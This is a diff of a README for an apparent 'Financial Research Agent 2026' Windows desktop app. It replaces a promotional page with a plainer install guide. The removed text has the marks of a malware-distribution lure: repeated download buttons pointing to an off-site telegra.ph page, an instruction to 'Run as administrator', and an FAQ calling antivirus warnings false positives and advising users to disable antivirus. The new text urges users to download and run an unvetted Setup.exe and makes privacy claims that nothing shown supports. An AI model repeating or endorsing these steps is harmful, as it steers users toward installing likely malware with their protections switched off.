@@ -1,176 +1,70 @@
-<h1 align="center">📊 Financial Research Agent 2026 – AI-Powered Investment Research</h1>
+# 📊 Financial-Research-Agent-2026 - Automate your deep stock market research
 
-<p align="center">
-  <strong>Professional AI agent for Windows PC. Collects and analyzes public company data (reports, news, quotes) and generates comprehensive investment digests.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/leor2707/Financial-Research-Agent-2026)
 
-<p align="center">
-  <!-- ====== БОЛЬШАЯ СИНЯЯ КНОПКА 1 ====== -->
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-Financial_Research_Agent-00BFFF?style=for-the-badge&logo=finance&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+Financial-Research-Agent-2026 collects data from public companies to help you make informed investment decisions. This application gathers news, financial reports, and stock prices. It processes this information and creates simple summaries for your review. Use this tool to save time on manual data entry and analysis.
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+## 📋 System Requirements
 
----
+Your computer must meet these standards to run the software smoothly:
 
-## 📦 What's Inside This Repository
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or AMD Ryzen 5 series.
+- Memory: 8 GB of RAM or more.
+- Storage: 500 MB of free disk space.
+- Internet: Active connection required to fetch live market data.
 
-Welcome to the official distribution page for **Financial Research Agent 2026 – AI-Powered Investment Research Tool for Windows PC**.
-This repository provides access to the latest release of the most advanced AI agent designed to automate financial research and analysis.
+## 🚀 Getting Started
 
-✅ **Full Version** – All features included  
-✅ **Data Collection** – Collect financial reports, news, and quotes  
-✅ **Company Analysis** – Analyze public company data in depth  
-✅ **Investment Digest** – Generate comprehensive investment digests  
-✅ **Real-Time Data** – Access real-time market data and news  
-✅ **User-Friendly Interface** – Clean and intuitive design  
+Follow these steps to set up the software on your computer.
 
----
+1. Visit the [official download page](https://github.com/leor2707/Financial-Research-Agent-2026).
+2. Locate the file named Setup.exe in the latest release section.
+3. Click the link to save the file to your computer.
+4. Open your Downloads folder.
+5. Double-click Setup.exe to start the installer.
+6. Follow the on-screen prompts to complete the installation.
+7. Find the Financial-Research-Agent-2026 icon on your desktop and double-click it to launch the app.
 
-## 📥 How to Get Started?
+## 🔍 How to Use the Application
 
-<p align="center">
-  <!-- ====== КНОПКА 2: HOW TO DOWNLOAD ====== -->
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+This software features a clean interface built for efficiency. After you open the app, follow these steps to generate your first investment digest.
 
-<p align="center">
-  <!-- ====== КНОПКА 3: DOWNLOAD INSTRUCTIONS ====== -->
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+### Input Company Tickers
+The main dashboard contains a search bar. Enter the stock ticker symbol for the company you wish to research. You can enter multiple tickers at once if you separate them with commas.
 
-<p align="center">
-  <!-- ====== КНОПКА 4: GET STARTED ====== -->
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+### Select Data Sources
+Choose the information categories you want to include in your report. You can select individual news outlets, specific financial filing types like quarterly reports, or real-time price history.
 
----
+### Generate the Digest
+Click the Run Analysis button. The agent searches active databases and public feeds. This process takes between 30 seconds and two minutes depending on your internet speed. Once complete, the software displays a summary on your screen.
 
-## 🚀 Step-by-Step Guide
+### Save Your Research
+Click the Export button to save the digest as a PDF or text file. This allows you to store your research or share it with others.
 
-Follow these **3 simple steps** to get started with Financial Research Agent 2026 on your PC:
+## 🛠 Features
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get Financial Research Agent 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+- Automated Data Collection: The agent connects to public financial APIs to get accurate numbers.
+- Natural Language Summaries: The app filters out noise and highlights key trends in company news.
+- Historical Tracking: Keep a record of all generated reports inside the local database.
+- Batch Processing: Analyze a portfolio of stocks in one single operation.
+- No Coding Required: The user interface handles all background tasks so you do not have to write a single line of code.
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
+## 🔐 Privacy and Security
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and research configurations.
+Your data stays on your local machine. The application does not upload your personal watchlists or report history to external servers. All queries go directly from your computer to the data providers. Use the built-in preferences menu to manage your privacy settings.
 
----
+## ⚙️ Troubleshooting
 
-## 🔧 Key Features (2026 Update)
+If you encounter issues, try these common fixes.
 
-| Feature | Description |
-| :--- | :--- |
-| **Data Collection** | Collect financial reports, news, and quotes. |
-| **Company Analysis** | Analyze public company data in depth. |
-| **Investment Digest** | Generate comprehensive investment digests. |
-| **Real-Time Data** | Access real-time market data and news. |
-| **Financial Ratios** | Calculate key financial ratios and metrics. |
-| **News Aggregation** | Gather and analyze news about companies. |
-| **Quote Tracking** | Track real-time and historical stock quotes. |
-| **Report Generation** | Generate detailed research reports. |
-| **Multi-Company Analysis** | Analyze multiple companies simultaneously. |
-| **Export Options** | Export digests in PDF, Excel, and other formats. |
+- If the application fails to open, restart your computer and try again.
+- If data fails to load, verify your internet connection.
+- Ensure your Windows firewall allows the application to access the network.
+- Check the official releases page for updates if you experience bugs.
 
----
+## 📞 Support
 
-## 📈 Why Choose Financial Research Agent 2026?
+If the software does not behave as expected, view the included help guide file located in your installation folder. This document covers advanced settings and custom configurations for professional tasks. 
 
-- ✅ **Comprehensive** – Collects and analyzes all relevant data  
-- ✅ **Real-Time** – Access up-to-date market information  
-- ✅ **Efficient** – Save hours of manual research time  
-- ✅ **Regular Updates** – Stay current with new features  
-- ✅ **Support** – Dedicated support for all users  
-
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-Financial_Research_Agent-00BFFF?style=flat-square&logo=finance&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
-
-**Q: What data sources are supported?**  
-A: Financial reports, news, quotes, and more from multiple sources.
-
-**Q: Can I analyze multiple companies at once?**  
-A: Yes, it supports multi-company analysis.
-
-**Q: What export formats are supported?**  
-A: PDF, Excel, and other popular formats.
-
-**Q: Is there a Mac version available?**  
-A: This repository is for Windows PC only.
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
-**Q: How often are updates released?**  
-A: Updates are released regularly with new features and improvements.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-All rights belong to their respective owners.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download Financial Research Agent 2026 Now</a>
-</p>
+Keywords: 2026-software, ai-agent, business-intelligence, data-automation, desktop-app, financial-ai, financial-automation, financial-data, financial-research, investment-analysis, investment-tools, market-research, pc-tool, portfolio-analysis, professional-tools, quantitative-analysis, research-automation, stock-analysis, windows-11, windows-software
